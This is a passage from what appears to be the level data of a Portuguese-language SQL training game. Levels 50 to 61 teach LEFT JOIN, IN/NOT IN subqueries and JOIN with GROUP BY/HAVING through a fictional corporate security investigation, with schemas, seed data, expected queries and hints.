    hint: "Use LEFT JOIN de crm_clients com crm_tickets em client_id, filtrando WHERE t.ticket_id IS NULL."
},
{
    id: 50,
    tier: "intermediario",
    certModule: "LEFT JOIN & Detecção de Anomalias",
    title: "Nível 50: Contratos Sem Revisão",
    briefing: "Todo contrato corporativo deveria passar por revisão periodicamente. Dra. Vance suspeita que contratos nunca revisados foram usados como brecha contratual para o incidente, e quer a lista completa deles.",
    objective: "Faça um LEFT JOIN de 'vendor_contracts' com 'contract_reviews' através da coluna 'contract_id'. Projete 'contract_id' e 'contract_name' apenas para contratos que não possuem nenhuma revisão associada (onde 'review_id' resultante é NULL). Ordene o resultado por 'contract_id' de forma crescente.",
    theory: {
        title: "LEFT JOIN e Detecção de Registros Ausentes",
        explanation: "O LEFT JOIN retorna todas as linhas da tabela à esquerda, combinadas com as correspondentes da tabela à direita quando existem — e com NULL nas colunas da direita quando não existem. Filtrando com WHERE coluna_da_direita IS NULL, encontramos exatamente os registros da esquerda que não têm nenhuma correspondência, ou seja, anomalias como itens sem cadastro relacionado.",
        syntax: "SELECT a.coluna1, a.coluna2\nFROM tabela_a a\nLEFT JOIN tabela_b b ON a.chave = b.chave\nWHERE b.chave_b IS NULL;",
        example: "-- Fornecedores homologados sem nenhuma avaliação de desempenho\nSELECT forn.fornecedor_id, forn.nome\nFROM fornecedores forn\nLEFT JOIN avaliacoes aval ON forn.fornecedor_id = aval.fornecedor_id\nWHERE aval.avaliacao_id IS NULL;"
    },
    schemaDDL: `
        CREATE TABLE vendor_contracts (
            contract_id INTEGER PRIMARY KEY,
            contract_name TEXT NOT NULL
        );
        CREATE TABLE contract_reviews (
            review_id INTEGER PRIMARY KEY,
            contract_id INTEGER NOT NULL,
            review_result TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO vendor_contracts (contract_name) VALUES
        ('Contrato-Fornecedor-A'),
        ('Contrato-Fornecedor-B'),
        ('Contrato-Cliente-C'),
        ('Contrato-Parceiro-D'),
        ('Contrato-Fornecedor-E'),
        ('Contrato-Cliente-F');
        INSERT INTO contract_reviews (contract_id, review_result) VALUES
        (1, 'Aprovado'),
        (2, 'Pendente'),
        (3, 'Aprovado'),
        (1, 'Reaprovado');
    `,
    expectedQuery: `
        SELECT
            c.contract_id,
            c.contract_name
        FROM vendor_contracts c
        LEFT JOIN contract_reviews r ON c.contract_id = r.contract_id
        WHERE r.review_id IS NULL
        ORDER BY c.contract_id ASC;
    `,
    hint: "Use LEFT JOIN de vendor_contracts com contract_reviews em contract_id, filtrando WHERE r.review_id IS NULL."
},
{
    id: 51,
    tier: "intermediario",
    certModule: "Sub-consultas (IN / NOT IN)",
    title: "Nível 51: Dispositivos com IP na Lista de Ameaças",
    briefing: "A equipe de inteligência de ameaças mantém uma lista de IPs classificados por nível de risco. Dra. Vance quer saber quais dispositivos do perímetro estão usando um endereço IP presente na lista de ameaças críticas.",
    objective: "Selecione 'device_id', 'ip_address' e 'device_label' de 'perimeter_devices' onde 'ip_address' esteja contido em uma subconsulta que retorna 'ip_address' de 'threat_intel_ips' cujo 'threat_level' seja igual a 'Critico'. Ordene o resultado por 'device_id' de forma crescente.",
    theory: {
        title: "Subconsultas com IN",
        explanation: "Uma subconsulta é uma consulta SELECT usada dentro de outra consulta. Com o operador IN, é possível filtrar linhas cuja coluna esteja presente na lista de valores retornada por essa subconsulta, permitindo comparar uma tabela contra um critério calculado dinamicamente em outra tabela.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela_a\nWHERE coluna_chave IN (\n    SELECT coluna_chave FROM tabela_b WHERE condicao\n);",
        example: "-- Produtos cujo fornecedor está na lista de fornecedores premium\nSELECT produto_id, nome\nFROM produtos\nWHERE fornecedor_id IN (\n    SELECT fornecedor_id FROM fornecedores WHERE categoria = 'Premium'\n);"
    },
    schemaDDL: `
        CREATE TABLE threat_intel_ips (
            intel_id INTEGER PRIMARY KEY,
            ip_address TEXT NOT NULL,
            threat_level TEXT NOT NULL
        );
        CREATE TABLE perimeter_devices (
            device_id INTEGER PRIMARY KEY,
            ip_address TEXT NOT NULL,
            device_label TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO threat_intel_ips (ip_address, threat_level) VALUES
        ('10.0.0.5', 'Critico'),
        ('10.0.0.9', 'Baixo'),
        ('10.0.0.14', 'Critico'),
        ('10.0.0.22', 'Medio');
        INSERT INTO perimeter_devices (ip_address, device_label) VALUES
        ('10.0.0.5', 'GW-01'),
        ('10.0.0.9', 'GW-02'),
        ('10.0.0.14', 'GW-03'),
        ('10.0.0.22', 'GW-04'),
        ('10.0.0.30', 'GW-05'),
        ('10.0.0.41', 'GW-06'),
        ('10.0.0.55', 'GW-07'),
        ('10.0.0.63', 'GW-08');
    `,
    expectedQuery: `
        SELECT
            device_id,
            ip_address,
            device_label
        FROM perimeter_devices
        WHERE ip_address IN (
            SELECT ip_address FROM threat_intel_ips WHERE threat_level = 'Critico'
        )
        ORDER BY device_id ASC;
    `,
    hint: "Use WHERE ip_address IN (SELECT ip_address FROM threat_intel_ips WHERE threat_level = 'Critico')."
},
{
    id: 52,
    tier: "intermediario",
    certModule: "Sub-consultas (IN / NOT IN)",
    title: "Nível 52: Colaboradores Sem Treinamento Obrigatório",
    briefing: "Toda a equipe deveria ter concluído o treinamento obrigatório de segurança da informação antes do incidente. Dra. Vance precisa da lista exata de quem ainda não completou esse treinamento, pois são os elos mais fracos da cadeia.",
    objective: "Selecione 'staff_id' e 'staff_name' de 'hr_staff' onde 'staff_id' NÃO esteja contido em uma subconsulta que retorna 'staff_id' de 'mandatory_training_completions'. Ordene o resultado por 'staff_id' de forma crescente.",
    theory: {
        title: "Subconsultas com NOT IN",
        explanation: "Uma subconsulta é uma consulta SELECT usada dentro de outra consulta. Com o operador NOT IN, é possível filtrar linhas cuja coluna NÃO esteja presente na lista de valores retornada por essa subconsulta — útil para encontrar registros que não têm nenhuma contrapartida em outra tabela.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela_a\nWHERE coluna_chave NOT IN (\n    SELECT coluna_chave FROM tabela_b\n);",
        example: "-- Livros que nunca foram emprestados na biblioteca\nSELECT livro_id, titulo\nFROM livros\nWHERE livro_id NOT IN (\n    SELECT livro_id FROM emprestimos\n);"
    },
    schemaDDL: `
        CREATE TABLE hr_staff (
            staff_id INTEGER PRIMARY KEY,
            staff_name TEXT NOT NULL
        );
        CREATE TABLE mandatory_training_completions (
            completion_id INTEGER PRIMARY KEY,
            staff_id INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO hr_staff (staff_name) VALUES
        ('Alice Furtado'),
        ('Bento Alencar'),
        ('Clarice Nogueira'),
        ('Diogo Peixoto'),
        ('Elaine Vasconcelos'),
        ('Fabricio Moraes'),
        ('Graziela Assuncao'),
        ('Hamilton Borges');
        INSERT INTO mandatory_training_completions (staff_id) VALUES
        (1),
        (2),
        (4),
        (6),
        (7);
    `,
    expectedQuery: `
        SELECT
            staff_id,
            staff_name
        FROM hr_staff
        WHERE staff_id NOT IN (
            SELECT staff_id FROM mandatory_training_completions
        )
        ORDER BY staff_id ASC;
    `,
    hint: "Use WHERE staff_id NOT IN (SELECT staff_id FROM mandatory_training_completions)."
},
{
    id: 53,
    tier: "intermediario",
    certModule: "Sub-consultas (IN / NOT IN)",
    title: "Nível 53: Contas Ligadas a Lavagem de Dinheiro",
    briefing: "O time de segurança categorizou transações suspeitas por motivo. Dra. Vance quer isolar apenas as contas que tiveram ao menos uma transação flagrada especificamente como possível lavagem de dinheiro.",
    objective: "Selecione 'account_id' e 'account_owner' de 'finance_accounts' onde 'account_id' esteja contido em uma subconsulta que retorna 'account_id' de 'suspicious_transactions' cujo 'flag_reason' seja igual a 'Lavagem'. Ordene o resultado por 'account_id' de forma crescente.",
    theory: {
        title: "Subconsultas com IN",
        explanation: "Uma subconsulta é uma consulta SELECT usada dentro de outra consulta. Com o operador IN, é possível filtrar linhas cuja coluna esteja presente na lista de valores retornada por essa subconsulta, permitindo comparar uma tabela contra um critério calculado dinamicamente em outra tabela.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela_a\nWHERE coluna_chave IN (\n    SELECT coluna_chave FROM tabela_b WHERE condicao\n);",
        example: "-- Pacientes com pelo menos um exame classificado como urgente\nSELECT paciente_id, nome\nFROM pacientes\nWHERE paciente_id IN (\n    SELECT paciente_id FROM exames WHERE prioridade = 'Urgente'\n);"
    },
    schemaDDL: `
        CREATE TABLE finance_accounts (
            account_id INTEGER PRIMARY KEY,
            account_owner TEXT NOT NULL
        );
        CREATE TABLE suspicious_transactions (
            transaction_id INTEGER PRIMARY KEY,
            account_id INTEGER NOT NULL,
            flag_reason TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO finance_accounts (account_id, account_owner) VALUES
        (10, 'Otavio Reis'),
        (20, 'Priscila Melo'),
        (30, 'Quintino Braga'),
        (40, 'Renata Fontes'),
        (50, 'Silvio Prado'),
        (60, 'Tania Rocha');
        INSERT INTO suspicious_transactions (account_id, flag_reason) VALUES
        (10, 'Lavagem'),
        (20, 'Fraude'),
        (30, 'Lavagem'),
        (40, 'Fraude'),
        (10, 'Lavagem');
    `,
    expectedQuery: `
        SELECT
            account_id,
            account_owner
        FROM finance_accounts
        WHERE account_id IN (
            SELECT account_id FROM suspicious_transactions WHERE flag_reason = 'Lavagem'
        )
        ORDER BY account_id ASC;
    `,
    hint: "Use WHERE account_id IN (SELECT account_id FROM suspicious_transactions WHERE flag_reason = 'Lavagem')."
},
{
    id: 54,
    tier: "intermediario",
    certModule: "Sub-consultas (IN / NOT IN)",
    title: "Nível 54: Pedidos Ainda Pendentes de Entrega",
    briefing: "Com a movimentação suspeita na logística, Dra. Vance quer isolar os pedidos que ainda não foram marcados como entregues, pois é aí que um pacote pode estar sendo desviado sem levantar alarmes imediatos.",
    objective: "Selecione 'order_id' e 'order_description' de 'logistics_orders' onde 'order_id' NÃO esteja contido em uma subconsulta que retorna 'order_id' de 'completed_deliveries'. Ordene o resultado por 'order_id' de forma crescente.",
    theory: {
        title: "Subconsultas com NOT IN",
        explanation: "Uma subconsulta é uma consulta SELECT usada dentro de outra consulta. Com o operador NOT IN, é possível filtrar linhas cuja coluna NÃO esteja presente na lista de valores retornada por essa subconsulta — útil para encontrar registros que não têm nenhuma contrapartida em outra tabela.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela_a\nWHERE coluna_chave NOT IN (\n    SELECT coluna_chave FROM tabela_b\n);",
        example: "-- Chamados de suporte que ainda não foram fechados\nSELECT chamado_id, assunto\nFROM chamados\nWHERE chamado_id NOT IN (\n    SELECT chamado_id FROM chamados_fechados\n);"
    },
    schemaDDL: `
        CREATE TABLE logistics_orders (
            order_id INTEGER PRIMARY KEY,
            order_description TEXT NOT NULL
        );
        CREATE TABLE completed_deliveries (
            delivery_id INTEGER PRIMARY KEY,
            order_id INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO logistics_orders (order_description) VALUES
        ('Pedido-Eletronicos'),
        ('Pedido-Moveis'),
        ('Pedido-Roupas'),
        ('Pedido-Alimentos'),
        ('Pedido-Livros'),
        ('Pedido-Brinquedos'),
        ('Pedido-Ferramentas');
        INSERT INTO completed_deliveries (order_id) VALUES
        (1),
        (3),
        (4),
        (6);
    `,
    expectedQuery: `
        SELECT
            order_id,
            order_description
        FROM logistics_orders
        WHERE order_id NOT IN (
            SELECT order_id FROM completed_deliveries
        )
        ORDER BY order_id ASC;
    `,
    hint: "Use WHERE order_id NOT IN (SELECT order_id FROM completed_deliveries)."
},
{
    id: 55,
    tier: "intermediario",
    certModule: "Sub-consultas (IN / NOT IN)",
    title: "Nível 55: Clientes com Pedidos de Alto Valor",
    briefing: "Transações de valor elevado costumam ser as mais visadas por fraude. Dra. Vance quer a lista de clientes que já realizaram ao menos um pedido acima de um limite considerado de alto risco.",
    objective: "Selecione 'customer_id' e 'customer_name' de 'retail_customers' onde 'customer_id' esteja contido em uma subconsulta que retorna 'customer_id' de 'high_value_orders' cujo 'order_value' seja superior a 5000. Ordene o resultado por 'customer_id' de forma crescente.",
    theory: {
        title: "Subconsultas com IN",
        explanation: "Uma subconsulta é uma consulta SELECT usada dentro de outra consulta. Com o operador IN, é possível filtrar linhas cuja coluna esteja presente na lista de valores retornada por essa subconsulta, permitindo comparar uma tabela contra um critério calculado dinamicamente em outra tabela.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela_a\nWHERE coluna_chave IN (\n    SELECT coluna_chave FROM tabela_b WHERE condicao\n);",
        example: "-- Motoristas que já fizeram alguma corrida com mais de 50 km\nSELECT motorista_id, nome\nFROM motoristas\nWHERE motorista_id IN (\n    SELECT motorista_id FROM corridas WHERE distancia_km > 50\n);"
    },
    schemaDDL: `
        CREATE TABLE retail_customers (
            customer_id INTEGER PRIMARY KEY,
            customer_name TEXT NOT NULL
        );
        CREATE TABLE high_value_orders (
            order_id INTEGER PRIMARY KEY,
            customer_id INTEGER NOT NULL,
            order_value REAL NOT NULL
        );
    `,
    seedData: `
        INSERT INTO retail_customers (customer_id, customer_name) VALUES
        (100, 'Ursula Prado'),
        (200, 'Vitor Amaral'),
        (300, 'Wanda Sales'),
        (400, 'Xavier Lima'),
        (500, 'Yasmin Costa'),
        (600, 'Zeca Andrade');
        INSERT INTO high_value_orders (customer_id, order_value) VALUES
        (100, 3000),
        (200, 6000),
        (300, 4000),
        (400, 7000),
        (200, 8000);
    `,
    expectedQuery: `
        SELECT
            customer_id,
            customer_name
        FROM retail_customers
        WHERE customer_id IN (
            SELECT customer_id FROM high_value_orders WHERE order_value > 5000
        )
        ORDER BY customer_id ASC;
    `,
    hint: "Use WHERE customer_id IN (SELECT customer_id FROM high_value_orders WHERE order_value > 5000)."
},
{
    id: 56,
    tier: "intermediario",
    certModule: "Multi-JOIN & Agregação Combinada",
    title: "Nível 56: Clientes com Alto Gasto em Eletrônicos",
    briefing: "Fase final da trilha intermediária. Dra. Vance quer combinar tudo: cruzar clientes com seus pedidos, focar apenas na categoria de produto mais visada pelo mercado paralelo — eletrônicos — e isolar quem gastou o suficiente para ser prioridade de investigação.",
    objective: "Cruze 'loyalty_customers' com 'product_orders' através de 'customer_id', considerando apenas pedidos com 'product_type' igual a 'Eletronicos'. Agrupe por cliente e projete 'customer_id', 'customer_name' e a soma de 'order_value' como 'total_spent'. Mantenha apenas os clientes com 'total_spent' superior a 3000 (HAVING SUM(order_value) > 3000). Ordene o resultado por 'total_spent' de forma decrescente.",
    theory: {
        title: "Combinando JOIN com GROUP BY e HAVING",
        explanation: "É possível combinar um JOIN entre tabelas relacionadas com GROUP BY e HAVING na mesma consulta: primeiro as tabelas são cruzadas e filtradas com WHERE, depois as linhas resultantes são agrupadas e agregadas, e por fim o HAVING filtra os grupos com base no valor agregado. Essa combinação é comum em relatórios de negócio que cruzam entidades e resumem valores.",
        syntax: "SELECT a.coluna_grupo, SUM(b.valor) AS total\nFROM tabela_a a\nJOIN tabela_b b ON a.chave = b.chave\nWHERE b.tipo = 'X'\nGROUP BY a.coluna_grupo\nHAVING SUM(b.valor) > 1000;",
        example: "-- Restaurantes com faturamento acima de R$2000 em pedidos de delivery\nSELECT r.restaurante_id, r.nome, SUM(p.valor) AS faturamento\nFROM restaurantes r\nJOIN pedidos p ON r.restaurante_id = p.restaurante_id\nWHERE p.canal = 'Delivery'\nGROUP BY r.restaurante_id, r.nome\nHAVING SUM(p.valor) > 2000;"
    },
    schemaDDL: `
        CREATE TABLE loyalty_customers (
            customer_id INTEGER PRIMARY KEY,
            customer_name TEXT NOT NULL
        );
        CREATE TABLE product_orders (
            order_id INTEGER PRIMARY KEY,
            customer_id INTEGER NOT NULL,
            product_type TEXT NOT NULL,
            order_value REAL NOT NULL
        );
    `,
    seedData: `
        INSERT INTO loyalty_customers (customer_name) VALUES
        ('Amanda Ferreira'),
        ('Bruno Castro'),
        ('Camila Duarte'),
        ('Diego Prado');
        INSERT INTO product_orders (customer_id, product_type, order_value) VALUES
        (1, 'Eletronicos', 2000),
        (1, 'Eletronicos', 1500),
        (1, 'Roupas', 500),
        (2, 'Eletronicos', 1000),
        (2, 'Roupas', 2000),
        (3, 'Eletronicos', 4000),
        (3, 'Eletronicos', 500),
        (4, 'Eletronicos', 3500),
        (4, 'Eletronicos', 200);
    `,
    expectedQuery: `
        SELECT
            c.customer_id,
            c.customer_name,
            SUM(o.order_value) AS total_spent
        FROM loyalty_customers c
        JOIN product_orders o ON c.customer_id = o.customer_id
        WHERE o.product_type = 'Eletronicos'
        GROUP BY c.customer_id, c.customer_name
        HAVING SUM(o.order_value) > 3000
        ORDER BY total_spent DESC, c.customer_id ASC;
    `,
    hint: "Combine JOIN entre loyalty_customers e product_orders, WHERE product_type = 'Eletronicos', GROUP BY cliente e HAVING SUM(order_value) > 3000."
},
{
    id: 57,
    tier: "intermediario",
    certModule: "Multi-JOIN & Agregação Combinada",
    title: "Nível 57: Transportadoras de Carga Refrigerada Consistentes",
    briefing: "Um lote de amostras biológicas sensíveis foi transportado sob refrigeração durante o período do incidente. Dra. Vance quer saber quais transportadoras têm histórico consistente (2 ou mais entregas) desse tipo de carga e qual o tempo médio delas.",
    objective: "Cruze 'freight_carriers' com 'freight_deliveries' através de 'carrier_id', considerando apenas entregas com 'cargo_type' igual a 'Refrigerado'. Agrupe por transportadora e projete 'carrier_id', 'carrier_name', a contagem de entregas como 'delivery_count' e a média de 'delivery_time_hours' arredondada para 2 casas decimais como 'avg_delivery_time'. Mantenha apenas as transportadoras com 2 ou mais entregas (HAVING COUNT(*) >= 2). Ordene o resultado por 'avg_delivery_time' de forma crescente.",
    theory: {
        title: "Combinando JOIN com GROUP BY e HAVING",
        explanation: "É possível combinar um JOIN entre tabelas relacionadas com GROUP BY e HAVING na mesma consulta: primeiro as tabelas são cruzadas e filtradas com WHERE, depois as linhas resultantes são agrupadas e agregadas, e por fim o HAVING filtra os grupos com base no valor agregado. Essa combinação é comum em relatórios de negócio que cruzam entidades e resumem valores.",
        syntax: "SELECT a.coluna_grupo, COUNT(*) AS total, AVG(b.valor) AS media\nFROM tabela_a a\nJOIN tabela_b b ON a.chave = b.chave\nWHERE b.tipo = 'X'\nGROUP BY a.coluna_grupo\nHAVING COUNT(*) >= 2;",
        example: "-- Oficinas com 2 ou mais reparos de motor e tempo médio de conserto\nSELECT of.oficina_id, of.nome, COUNT(*) AS reparos, ROUND(AVG(r.dias_conserto), 2) AS tempo_medio\nFROM oficinas of\nJOIN reparos r ON of.oficina_id = r.oficina_id\nWHERE r.tipo_servico = 'Motor'\nGROUP BY of.oficina_id, of.nome\nHAVING COUNT(*) >= 2;"
    },
    schemaDDL: `
        CREATE TABLE freight_carriers (
            carrier_id INTEGER PRIMARY KEY,
            carrier_name TEXT NOT NULL
        );
        CREATE TABLE freight_deliveries (
            delivery_id INTEGER PRIMARY KEY,
            carrier_id INTEGER NOT NULL,
            cargo_type TEXT NOT NULL,
            delivery_time_hours REAL NOT NULL
        );
    `,
    seedData: `
        INSERT INTO freight_carriers (carrier_name) VALUES
        ('FrioLog'),
        ('TransFrio'),
        ('PolarCargo'),
        ('GeloExpress');
        INSERT INTO freight_deliveries (carrier_id, cargo_type, delivery_time_hours) VALUES
        (1, 'Refrigerado', 10),
        (1, 'Refrigerado', 12),
        (1, 'Seco', 5),
        (2, 'Refrigerado', 8),
        (2, 'Seco', 6),
        (3, 'Refrigerado', 20),
        (3, 'Refrigerado', 22),
        (3, 'Refrigerado', 18),
        (4, 'Refrigerado', 15);
    `,
    expectedQuery: `
        SELECT
            c.carrier_id,
            c.carrier_name,
            COUNT(*) AS delivery_count,
            ROUND(AVG(d.delivery_time_hours), 2) AS avg_delivery_time
        FROM freight_carriers c
        JOIN freight_deliveries d ON c.carrier_id = d.carrier_id
        WHERE d.cargo_type = 'Refrigerado'
        GROUP BY c.carrier_id, c.carrier_name
        HAVING COUNT(*) >= 2
        ORDER BY avg_delivery_time ASC, c.carrier_id ASC;
    `,
    hint: "Combine JOIN entre freight_carriers e freight_deliveries, WHERE cargo_type = 'Refrigerado', GROUP BY transportadora e HAVING COUNT(*) >= 2."
},
{
    id: 58,
    tier: "intermediario",
    certModule: "Multi-JOIN & Agregação Combinada",
    title: "Nível 58: Contas com Despesas Elevadas no Razão",
    briefing: "O livro-razão financeiro mistura receitas e despesas na mesma tabela de transações. Dra. Vance quer isolar apenas o lado das despesas e descobrir quais contas contábeis acumularam um gasto alto o suficiente para levantar suspeita.",
    objective: "Cruze 'ledger_accounts' com 'ledger_transactions' através de 'account_id', considerando apenas transações com 'transaction_type' igual a 'Despesa'. Agrupe por conta e projete 'account_id', 'account_name' e a soma de 'amount' como 'total_expenses'. Mantenha apenas as contas com 'total_expenses' superior a 4000 (HAVING SUM(amount) > 4000). Ordene o resultado por 'total_expenses' de forma decrescente.",
    theory: {
        title: "Combinando JOIN com GROUP BY e HAVING",
        explanation: "É possível combinar um JOIN entre tabelas relacionadas com GROUP BY e HAVING na mesma consulta: primeiro as tabelas são cruzadas e filtradas com WHERE, depois as linhas resultantes são agrupadas e agregadas, e por fim o HAVING filtra os grupos com base no valor agregado. Essa combinação é comum em relatórios de negócio que cruzam entidades e resumem valores.",
        syntax: "SELECT a.coluna_grupo, SUM(b.valor) AS total\nFROM tabela_a a\nJOIN tabela_b b ON a.chave = b.chave\nWHERE b.tipo = 'X'\nGROUP BY a.coluna_grupo\nHAVING SUM(b.valor) > 1000;",
        example: "-- Departamentos com gastos de viagem acima de R$5000\nSELECT d.departamento_id, d.nome, SUM(v.valor) AS total_viagens\nFROM departamentos d\nJOIN despesas_viagem v ON d.departamento_id = v.departamento_id\nWHERE v.categoria = 'Viagem'\nGROUP BY d.departamento_id, d.nome\nHAVING SUM(v.valor) > 5000;"
    },
    schemaDDL: `
        CREATE TABLE ledger_accounts (
            account_id INTEGER PRIMARY KEY,
            account_name TEXT NOT NULL
        );
        CREATE TABLE ledger_transactions (
            transaction_id INTEGER PRIMARY KEY,
            account_id INTEGER NOT NULL,
            transaction_type TEXT NOT NULL,
            amount REAL NOT NULL
        );
    `,
    seedData: `
        INSERT INTO ledger_accounts (account_name) VALUES
        ('Conta-Operacional'),
        ('Conta-Marketing'),
        ('Conta-TI'),
        ('Conta-RH');
        INSERT INTO ledger_transactions (account_id, transaction_type, amount) VALUES
        (1, 'Despesa', 2000),
        (1, 'Despesa', 2500),
        (1, 'Receita', 5000),
        (2, 'Despesa', 1000),
        (2, 'Receita', 3000),
        (3, 'Despesa', 3000),
        (3, 'Despesa', 2500),
        (3, 'Despesa', 1000),
        (4, 'Despesa', 3500),
        (4, 'Despesa', 800);
    `,
    expectedQuery: `
        SELECT
            a.account_id,
            a.account_name,
            SUM(t.amount) AS total_expenses
        FROM ledger_accounts a
        JOIN ledger_transactions t ON a.account_id = t.account_id
        WHERE t.transaction_type = 'Despesa'
        GROUP BY a.account_id, a.account_name
        HAVING SUM(t.amount) > 4000
        ORDER BY total_expenses DESC, a.account_id ASC;
    `,
    hint: "Combine JOIN entre ledger_accounts e ledger_transactions, WHERE transaction_type = 'Despesa', GROUP BY conta e HAVING SUM(amount) > 4000."
},
{
    id: 59,
    tier: "intermediario",
    certModule: "Multi-JOIN & Agregação Combinada",
    title: "Nível 59: Servidores com Múltiplos Incidentes Críticos",
    briefing: "O time de DevOps registrou incidentes com diferentes níveis de severidade. Dra. Vance quer isolar apenas os servidores que sofreram 2 ou mais incidentes classificados como críticos — esses são os que exigem isolamento imediato da rede.",
    objective: "Cruze 'datacenter_servers' com 'critical_incidents' através de 'server_id', considerando apenas incidentes com 'severity' igual a 'Critico'. Agrupe por servidor e projete 'server_id', 'server_name' e a contagem de incidentes como 'critical_count'. Mantenha apenas os servidores com 2 ou mais incidentes críticos (HAVING COUNT(*) >= 2). Ordene o resultado por 'critical_count' de forma decrescente.",
    theory: {
        title: "Combinando JOIN com GROUP BY e HAVING",
        explanation: "É possível combinar um JOIN entre tabelas relacionadas com GROUP BY e HAVING na mesma consulta: primeiro as tabelas são cruzadas e filtradas com WHERE, depois as linhas resultantes são agrupadas e agregadas, e por fim o HAVING filtra os grupos com base no valor agregado. Essa combinação é comum em relatórios de negócio que cruzam entidades e resumem valores.",
        syntax: "SELECT a.coluna_grupo, COUNT(*) AS total\nFROM tabela_a a\nJOIN tabela_b b ON a.chave = b.chave\nWHERE b.tipo = 'X'\nGROUP BY a.coluna_grupo\nHAVING COUNT(*) >= 2;",
        example: "-- Linhas de produção com 2 ou mais paradas classificadas como graves\nSELECT lp.linha_id, lp.nome, COUNT(*) AS paradas_graves\nFROM linhas_producao lp\nJOIN paradas pa ON lp.linha_id = pa.linha_id\nWHERE pa.gravidade = 'Grave'\nGROUP BY lp.linha_id, lp.nome\nHAVING COUNT(*) >= 2;"
    },
    schemaDDL: `
        CREATE TABLE datacenter_servers (
            server_id INTEGER PRIMARY KEY,
            server_name TEXT NOT NULL
        );
        CREATE TABLE critical_incidents (
            incident_id INTEGER PRIMARY KEY,
            server_id INTEGER NOT NULL,
            severity TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO datacenter_servers (server_name) VALUES
        ('srv-prod-01'),
        ('srv-prod-02'),
        ('srv-staging-01'),
        ('srv-prod-03');
        INSERT INTO critical_incidents (server_id, severity) VALUES
        (1, 'Critico'),
        (1, 'Critico'),
        (1, 'Baixo'),
        (2, 'Critico'),
        (2, 'Medio'),
        (3, 'Critico'),
        (3, 'Critico'),
        (3, 'Critico'),
        (4, 'Baixo'),
        (4, 'Medio');
    `,
    expectedQuery: `
        SELECT
            s.server_id,
            s.server_name,
            COUNT(*) AS critical_count
        FROM datacenter_servers s
        JOIN critical_incidents i ON s.server_id = i.server_id
        WHERE i.severity = 'Critico'
        GROUP BY s.server_id, s.server_name
        HAVING COUNT(*) >= 2
        ORDER BY critical_count DESC, s.server_id ASC;
    `,
    hint: "Combine JOIN entre datacenter_servers e critical_incidents, WHERE severity = 'Critico', GROUP BY servidor e HAVING COUNT(*) >= 2."
},
{
    id: 60,
    tier: "intermediario",
    certModule: "Multi-JOIN & Agregação Combinada",
    title: "Nível 60: Folha de Pagamento CLT por Departamento",
    briefing: "Última peça do quebra-cabeça intermediário. Dra. Vance precisa fechar o relatório de exposição financeira da Aethelgard: cruzar departamentos com seus funcionários CLT e identificar quais departamentos têm folha de pagamento alta o suficiente para justificar uma revisão trabalhista prioritária.",
    objective: "Cruze 'company_departments' com 'dept_employees' através de 'department_id', considerando apenas funcionários com 'contract_type' igual a 'CLT'. Agrupe por departamento e projete 'department_id', 'department_name' e a soma de 'salary' como 'total_payroll'. Mantenha apenas os departamentos com 'total_payroll' superior a 10000 (HAVING SUM(salary) > 10000). Ordene o resultado por 'total_payroll' de forma decrescente.",
    theory: {
        title: "Combinando JOIN com GROUP BY e HAVING",
        explanation: "É possível combinar um JOIN entre tabelas relacionadas com GROUP BY e HAVING na mesma consulta: primeiro as tabelas são cruzadas e filtradas com WHERE, depois as linhas resultantes são agrupadas e agregadas, e por fim o HAVING filtra os grupos com base no valor agregado. Essa combinação é comum em relatórios de negócio que cruzam entidades e resumem valores.",
        syntax: "SELECT a.coluna_grupo, SUM(b.valor) AS total\nFROM tabela_a a\nJOIN tabela_b b ON a.chave = b.chave\nWHERE b.tipo = 'X'\nGROUP BY a.coluna_grupo\nHAVING SUM(b.valor) > 1000;",
        example: "-- Equipes com folha de pagamento de estagiários acima de R$8000\nSELECT eq.equipe_id, eq.nome, SUM(f.salario) AS folha_total\nFROM equipes eq\nJOIN funcionarios f ON eq.equipe_id = f.equipe_id\nWHERE f.tipo_vinculo = 'Estagio'\nGROUP BY eq.equipe_id, eq.nome\nHAVING SUM(f.salario) > 8000;"
    },
    schemaDDL: `
        CREATE TABLE company_departments (
            department_id INTEGER PRIMARY KEY,
            department_name TEXT NOT NULL
        );
        CREATE TABLE dept_employees (
            employee_id INTEGER PRIMARY KEY,
            department_id INTEGER NOT NULL,
            salary REAL NOT NULL,
            contract_type TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO company_departments (department_name) VALUES
        ('Engenharia'),
        ('Marketing'),
        ('Financeiro'),
        ('Juridico');
        INSERT INTO dept_employees (department_id, salary, contract_type) VALUES
        (1, 5000, 'CLT'),
        (1, 6000, 'CLT'),
        (1, 4000, 'PJ'),
        (2, 3000, 'CLT'),
        (2, 2000, 'PJ'),
        (3, 7000, 'CLT'),
        (3, 6000, 'CLT'),
        (3, 5000, 'CLT'),
        (4, 4000, 'CLT'),
        (4, 3000, 'CLT');
    `,
    expectedQuery: `
        SELECT
            d.department_id,
            d.department_name,
            SUM(e.salary) AS total_payroll
        FROM company_departments d
        JOIN dept_employees e ON d.department_id = e.department_id
        WHERE e.contract_type = 'CLT'
        GROUP BY d.department_id, d.department_name
        HAVING SUM(e.salary) > 10000
        ORDER BY total_payroll DESC, d.department_id ASC;
    `,
    hint: "Combine JOIN entre company_departments e dept_employees, WHERE contract_type = 'CLT', GROUP BY departamento e HAVING SUM(salary) > 10000."
},

{
    id: 61,
    tier: "avancado",
    certModule: "ROW_NUMBER() e RANK() — Ordenação por Grupo",
    title: "Nível 61: O Último Comando Suspeito",
    briefing: "Dra. Vance confirmou que múltiplos terminais da Aethelgard Dynamics foram comprometidos. Antes de isolar cada host, ela precisa saber qual foi o comando malicioso mais recente executado em cada um deles — é a pista mais fresca da presença do invasor.",
    objective: "Considere apenas comandos com is_suspicious = 1. Para cada host_id, encontre o comando MAIS RECENTE (maior executed_at) entre eles. Projete host_id, command e executed_at AS ultimo_comando_suspeito. Exiba apenas hosts que possuem ao menos um comando suspeito. Ordene por host_id ASC.",
    theory: {
        title: "Window Functions — ROW_NUMBER() e RANK() com PARTITION BY",
